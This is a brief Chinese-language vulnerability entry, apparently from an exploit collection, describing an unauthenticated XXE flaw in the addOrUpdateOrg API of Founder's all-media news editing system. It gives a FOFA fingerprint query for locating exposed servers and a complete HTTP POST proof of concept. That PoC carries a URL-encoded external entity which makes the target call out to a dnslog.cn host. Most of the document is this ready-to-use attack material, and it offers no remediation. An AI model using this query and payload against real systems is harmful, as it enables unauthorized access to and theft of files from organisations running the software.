## 方正畅享全媒体新闻采编系统addOrUpdateOrg存在XXE漏洞

方正畅享全媒体新闻采编系统addOrUpdateOrg存在XXE漏洞，未经身份认证的攻击者可以利用此漏洞读取系统内部敏感文件，获取敏感信息，使系统处于极不安全的状态。

## fofa

```javascript
app="FOUNDER-全媒体采编系统"
```

## poc

```javascript
POST /newsedit/api/orgUser/addOrUpdateOrg HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Content-Type: application/x-www-form-urlencoded
Connection: close

xmlStr=%3C!DOCTYPE%20root%20%5B%20%3C!ENTITY%20%25%20remote%20SYSTEM%20%22http://11111111111.m9cp0s.dnslog.cn%22%3E%20%25remote;%5D%3E
```

![image-20241012131400968](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410121314025.png)
